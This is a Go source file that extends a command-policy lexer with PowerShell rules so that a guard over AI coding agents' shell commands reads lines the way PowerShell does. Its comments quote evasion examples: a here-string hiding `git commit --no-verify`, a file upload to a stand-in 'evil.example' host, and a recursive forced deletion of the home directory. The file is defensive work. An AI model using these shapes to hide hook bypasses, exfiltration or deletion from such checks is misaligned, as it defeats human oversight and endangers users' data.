package policy

import "strings"

// PowerShell token rules the shared lexer applies under psLexSpec
// (lexSpec.psSyntax), added when the git hook-bypass rules (R-112 to R-114)
// met PowerShell on Windows (PSRULES lane, JSP-6 live half: Claude Code's
// PowerShell tool, and Codex and Copilot CLI running every command through
// Windows PowerShell 5.1). Each rule exists because the lexer read a real
// PowerShell line differently from PowerShell:
//
//   - a here-string (@'...'@ / @"..."@) is ONE string. Lexed as ordinary
//     quotes, an apostrophe inside it ("it's") opened a quote that swallowed
//     the rest of the line, so `$m = @'<nl>it's<nl>'@; git commit -m $m
//     --no-verify` hid its --no-verify.
//   - a comment (# to the end of the line, <# ... #>) at the start of a
//     token is not code, so `git commit -m x # --no-verify` is an ordinary
//     commit.
//   - a backtick before a newline continues the line; it is whitespace, not
//     an escaped newline character glued into the next word.
//
// Every rule is fail-safe in the same sense as the rest of this package:
// when the text does not have exactly the shape PowerShell requires (a
// header with characters after it, a terminator that is not at column 0, an
// unterminated block comment) the rule does not apply and the text is lexed
// as before, which analyses MORE, never less.

// psHereStringAt reports a PowerShell here-string starting at s[i] ('@'):
// the header (@' or @") followed only by spaces or tabs up to the end of
// the line, and a terminator ('@ or "@) at column 0 of a later line.
// PowerShell rejects anything else (text after the header, whitespace
// before the terminator), so anything else is not a here-string here
// either. bodyStart and bodyEnd delimit the text between the header line
// and the terminator line (the newline before the terminator, and a
// carriage return before that, excluded); next is the index after the
// terminator.
func psHereStringAt(s string, i int) (quote byte, bodyStart, bodyEnd, next int, ok bool) {
	if i+1 >= len(s) || s[i] != '@' || (s[i+1] != '\'' && s[i+1] != '"') {
		return 0, 0, 0, 0, false
	}
	quote = s[i+1]
	j := i + 2
	for j < len(s) && (s[j] == ' ' || s[j] == '\t') {
		j++
	}
	if j < len(s) && s[j] == '\r' {
		j++
	}
	if j >= len(s) || s[j] != '\n' {
		return 0, 0, 0, 0, false
	}
	bodyStart = j + 1
	term := string([]byte{quote, '@'})
	if strings.HasPrefix(s[bodyStart:], term) {
		return quote, bodyStart, bodyStart, bodyStart + 2, true
	}
	k := strings.Index(s[bodyStart:], "\n"+term)
	if k < 0 {
		return 0, 0, 0, 0, false
	}
	nl := bodyStart + k
	bodyEnd = nl
	if bodyEnd > bodyStart && s[bodyEnd-1] == '\r' {
		bodyEnd--
	}
	return quote, bodyStart, bodyEnd, nl + 3, true
}

// psLineContinuation returns how many bytes a PowerShell line continuation
// at s[i] (the escape character) spans: 2 for a backtick before "\n", 3
// before "\r\n", 0 when s[i] does not start one.
func psLineContinuation(s string, i int) int {
	switch {
	case i+1 < len(s) && s[i+1] == '\n':
		return 2
	case i+2 < len(s) && s[i+1] == '\r' && s[i+2] == '\n':
		return 3
	}
	return 0
}

// psTokenStart reports whether the lexer stands at the start of a token:
// nothing is pending in the current word (a quote that closed counts as
// pending: an empty quoted string followed by #x is one word) and the byte before is not the place of a
// removed substitution (`$(x)#y` is one word to PowerShell).
func (lx *lexer) psTokenStart() bool {
	return lx.cur.Len() == 0 && !lx.has && (lx.i == 0 || lx.src[lx.i-1] != subMarker)
}

// psToken consumes a here-string or a comment starting at lx.i (byte c)
// and reports whether it did; when it reports false nothing was consumed
// and the byte is lexed as before.
func (lx *lexer) psToken(c byte) bool {
	switch c {
	case '@':
		return lx.psHereString()
	case '#', '<':
		return lx.psComment()
	}
	return false
}

// psHereString consumes a here-string at lx.i as one quoted word (a
// single-quoted body is literal text, a double-quoted body is text the
// substitution pass has already handled). It applies only where a value
// can begin: at a token start or after '=' or ',' (`$m=@'`). It reports
// false, consuming nothing, when there is no here-string.
func (lx *lexer) psHereString() bool {
	if lx.cur.Len() > 0 {
		w := lx.cur.String()
		if last := w[len(w)-1]; last != '=' && last != ',' {
			return false
		}
	} else if lx.has {
		return false
	}
	q, bs, be, next, ok := psHereStringAt(lx.src, lx.i)
	if !ok {
		return false
	}
	for k := bs; k < be; k++ {
		if q == '\'' {
			lx.writeLit(lx.src[k])
		} else {
			lx.writeQuoted(lx.src[k])
		}
	}
	lx.has = true
	lx.i = next
	return true
}

// psComment skips a comment at lx.i when one starts there: `#` to the end
// of the line (the newline itself is kept: it separates units), or
// `<#` to the next `#>`. An unterminated block comment is a PowerShell
// parse error, but it is lexed as text here (analysing more). It reports
// false, consuming nothing, when no comment starts at lx.i.
func (lx *lexer) psComment() bool {
	if !lx.psTokenStart() {
		return false
	}
	s := lx.src
	switch {
	case s[lx.i] == '#':
		if lx.i > 0 && s[lx.i-1] == '<' {
			// The '#' of a block-comment opener that found no "#>": the
			// opener is text, so its '#' must not start a line comment
			// that hides the rest of the line.
			return false
		}
		end := strings.IndexByte(s[lx.i:], '\n')
		if end < 0 {
			lx.i = len(s)
		} else {
			lx.i += end
		}
		return true
	case s[lx.i] == '<' && lx.i+1 < len(s) && s[lx.i+1] == '#':
		end := strings.Index(s[lx.i+2:], "#>")
		if end < 0 {
			return false
		}
		lx.i += 2 + end + 2
		return true
	}
	return false
}

// stripOpts selects the substitution pass's reading of a line
// (stripSubstitutionsOpts).
type stripOpts struct {
	// mark leaves subMarker where each substitution was.
	mark bool
	// psEscape applies the PowerShell escape facts parseDepth documents
	// (T-534) and the here-string rule below.
	psEscape bool
	// psTicks reads every backtick as PowerShell's escape character, as
	// PowerShell does, instead of as a POSIX substitution span. Only the
	// PowerShell tick reading (parseDepth) sets it.
	psTicks bool
	// noSingle stops an apostrophe opening a single-quoted region: the
	// text is the body of a here-string.
	noSingle bool
	// psParens reads a parenthesis that opens a PowerShell ARGUMENT as a
	// subexpression, the way `$(` is read (psArgScan, NF-1). Only the
	// PowerShell reading of a command line sets it; a here-string body is
	// text, so psHereBody clears it.
	psParens bool
}

// psHereBody is the substitution pass over a here-string body: apostrophes
// are text there, so they must not open a quote that hides a later
// substitution. A single-quoted body does not expand in PowerShell; its
// substitutions are still stripped and analysed (more, never less), which
// keeps this pass from depending on where the lexer thinks a quote is. A
// parenthesis in the body is text (psParens off).
func psHereBody(body string, o stripOpts) (string, []string, bool) {
	o.noSingle = true
	o.psParens = false
	return stripSubstitutionsOpts(body, o)
}

// PARENTHESISED ARGUMENTS (NF-1, guard-parser lane 2026-11-22).
//
// In PowerShell `cmd -Uri ('http://evil'+'.example') -InFile ./a.bin`
// passes the VALUE of the parenthesised expression to -Uri; the command
// goes on after the `)`. The lexer reads an unquoted `(` at word start as a
// unit separator (the POSIX subshell reading, which is also right for a
// PowerShell group that STARTS a statement), so the line became three
// units: `iwr -Uri`, the expression, and `-InFile ./a.bin ...` with the
// parameter `-infile` as its Base. Every rule keyed on the cmdlet missed
// the words after the parenthesis: R-171 never saw -InFile, and
// `Remove-Item -Path ("~") -Recurse -Force` lost its -Recurse.
//
// The substitution pass now reads such a parenthesis the way it reads
// `$(`: the expression is removed (and parsed as a nested unit), a
// subMarker is left in its place so the unit records that it lost a value
// (unit.hadSub), and the command stays one unit. psArgScan decides which
// parentheses are arguments. Every decision below is a row of the
// PowerShell grammar the scan follows:
//
//   - only a `(` at WORD START counts, or one right after a colon-bound
//     parameter name (`-Path:(x)`, bound exactly like `-Path (x)`); one
//     glued to any other word (`a,(b)`, `$x.M(a)`, `@(...)`) stays inside
//     that word, as the lexer already read it.
//   - only AFTER THE STATEMENT'S FIRST WORD: a group that starts a
//     statement (`(Get-Item x).Delete()`) is not an argument.
//   - not when the statement's first word, or the word just before the
//     `(`, is a keyword whose parentheses hold a condition, a loop header
//     or a parameter list (psParenKeywords): `if (...)`, `} while (...)`,
//     `switch -Regex (...)`, `function f (...)`, `function f($x)`; and not
//     anywhere inside such a keyword's parentheses (`if (Test-Path (x))`,
//     a parameter default `function f($x = (Get-Date))`), which keep the
//     reading they had (T-534 pins the parameter-default case).
//   - a statement ends at a newline, `;`, `|`, `&&`, `||` and the call
//     operator `&`; a `{` or an unconverted `(` opens a nested statement
//     (a script block, a hash literal, a group) that ends at its closer,
//     after which the enclosing statement continues with the group as one
//     of its words.
//   - nothing inside a comment (`#` to the end of the line, `<# ... #>`)
//     and nothing after the stop-parsing token `--%` (until a newline or a
//     pipe) is converted: neither is code PowerShell parses.
//
// The scan only ever sees bytes outside quotes, and only the first byte of
// a construct the substitution pass consumes whole (a quote, an escape, a
// `$(`), which it counts as part of the current word.
//
// Approximation: a converted parenthesis is one unwrap level, like `$(`,
// so arguments nested more than maxUnwrapDepth deep mark the line
// Unanalyzed (R-157), the same limit `$(` has.

// psParenKeywords are the PowerShell keywords whose parentheses are not an
// argument: a condition (if, elseif, while, until, switch), a loop header
// (for, foreach), an exception type list (catch, trap) or a parameter list
// (function, filter, param).
var psParenKeywords = setOf("if", "elseif", "while", "foreach", "for", "switch", "until", "catch", "trap", "function", "filter", "param")

// psStmt is the state of one PowerShell statement psArgScan is reading.
type psStmt struct {
	// words counts the statement's completed words.
	words int
	// inWord reports a word in progress.
	inWord bool
	// word holds the word in progress (lowercased), first and prev the
	// statement's first and latest completed words.
	word        []byte
	first, prev string
	// keyParens reports a statement inside a keyword's parentheses
	// (psParenKeywords), where no parenthesis is an argument.
	keyParens bool
}

// psArgScan follows a PowerShell line through the substitution pass to tell
// which parentheses open an argument (the rules above).
type psArgScan struct {
	// outer holds the enclosing statements of a nested one, innermost
	// last.
	outer []psStmt
	cur   psStmt
	// comment is '#' inside a line comment, '<' inside a block comment.
	comment byte
	// stop reports the stop-parsing token `--%` earlier on the line.
	stop bool
}

// step reads the byte at s[i], which the substitution pass is about to
// consume outside quotes, and reports whether it is a `(` that opens an
// argument. A byte that starts a construct the pass consumes whole is
// counted as part of the current word.
func (a *psArgScan) step(s string, i int) bool {
	c := s[i]
	if a.comment != 0 {
		switch {
		case a.comment == '#' && c == '\n':
			a.comment, a.stop = 0, false
			a.endStatement()
		case a.comment == '<' && c == '>' && i > 0 && s[i-1] == '#':
			a.comment = 0
		}
		return false
	}
	switch c {
	case ' ', '\t', '\r', '>', '<':
		if c == '<' && !a.cur.inWord && i+1 < len(s) && s[i+1] == '#' {
			a.comment = '<'
			return false
		}
		a.endWord()
	case '\n', '|':
		a.stop = false
		a.endStatement()
	case ';':
		a.endStatement()
	case '&':
		if i == 0 || s[i-1] != '>' { // `2>&1` is a redirect, not a statement end
			a.endStatement()
		}
	case '`':
		if psLineContinuation(s, i) > 0 {
			a.endWord() // a line continuation is whitespace
			return false
		}
		a.wordByte(c)
	case '#':
		if !a.cur.inWord {
			a.comment = '#'
			return false
		}
		a.wordByte(c)
	case '{':
		a.open(false)
	case '}', ')':
		a.close()
	case '(':
		if a.argument() {
			return true
		}
		a.open(a.cur.keyParens || a.keyword())
	default:
		a.wordByte(c)
	}
	return false
}

// argument reports whether a `(` at the scan's position opens an argument:
// at word start, or glued to a colon-bound parameter (`-Path:(...)`, which
// PowerShell binds exactly as `-Path (...)`).
func (a *psArgScan) argument() bool {
	st := &a.cur
	atValue := !st.inWord
	if st.inWord {
		_, v, ok := psColonParam(string(st.word))
		atValue = ok && v == ""
	}
	return !a.stop && !st.keyParens && atValue && st.words > 0 && !a.keyword()
}

// keyword reports whether the statement in progress is led by, or has just
// read, a keyword whose parentheses are not an argument.
func (a *psArgScan) keyword() bool {
	return psParenKeywords[a.cur.first] || psParenKeywords[a.cur.prev]
}

// wordByte adds one byte to the word in progress.
func (a *psArgScan) wordByte(c byte) {
	if c >= 'A' && c <= 'Z' {
		c += 'a' - 'A'
	}
	a.cur.inWord = true
	a.cur.word = append(a.cur.word, c)
}

// endWord completes the word in progress, if any.
func (a *psArgScan) endWord() {
	st := &a.cur
	if !st.inWord {
		return
	}
	w := string(st.word)
	if st.words == 0 {
		st.first = w
	}
	st.prev = w
	st.words++
	st.inWord, st.word = false, st.word[:0]
	if w == "--%" {
		a.stop = true
	}
}

// endStatement starts a new statement at the same nesting level.
func (a *psArgScan) endStatement() {
	a.cur = psStmt{}
}

// open starts a nested statement (a script block, a hash literal, a group,
// a condition), saving the enclosing one. keyParens marks the inside of a
// keyword's parentheses (psStmt.keyParens); a script block never is.
func (a *psArgScan) open(keyParens bool) {
	saved := a.cur
	saved.word = append([]byte(nil), a.cur.word...)
	a.outer = append(a.outer, saved)
	a.cur = psStmt{keyParens: keyParens}
}

// close ends a nested statement: the enclosing statement continues, the
// group being part of its current word. A closer with nothing open ends
// the statement, as the lexer's separator reading does.
func (a *psArgScan) close() {
	n := len(a.outer)
	if n == 0 {
		a.endStatement()
		return
	}
	a.cur, a.outer = a.outer[n-1], a.outer[:n-1]
	a.cur.inWord = true
}

// psParenEnd returns the index of the `)` that closes the `(` at s[i],
// reading PowerShell quotes (a quote's parentheses are text) and escapes.
// ok is false when the parenthesis is never closed.
func psParenEnd(s string, i int) (end int, ok bool) {
	depth := 0
	for j := i; j < len(s); j++ {
		switch s[j] {
		case '`':
			j++
		case '\'':
			k := strings.IndexByte(s[j+1:], '\'')
			if k < 0 {
				return 0, false
			}
			j += k + 1
		case '"':
			if j, ok = psDoubleQuoteEnd(s, j); !ok {
				return 0, false
			}
		case '(':
			depth++
		case ')':
			depth--
			if depth == 0 {
				return j, true
			}
		}
	}
	return 0, false
}

// psDoubleQuoteEnd returns the index of the `"` that closes the
// double-quoted string at s[i]; a subexpression inside it is skipped whole,
// so its own quotes do not end the string.
func psDoubleQuoteEnd(s string, i int) (end int, ok bool) {
	for j := i + 1; j < len(s); j++ {
		switch s[j] {
		case '`':
			j++
		case '"':
			return j, true
		case '$':
			if j+1 < len(s) && s[j+1] == '(' {
				if j, ok = psParenEnd(s, j+1); !ok {
					return 0, false
				}
			}
		}
	}
	return 0, false
}
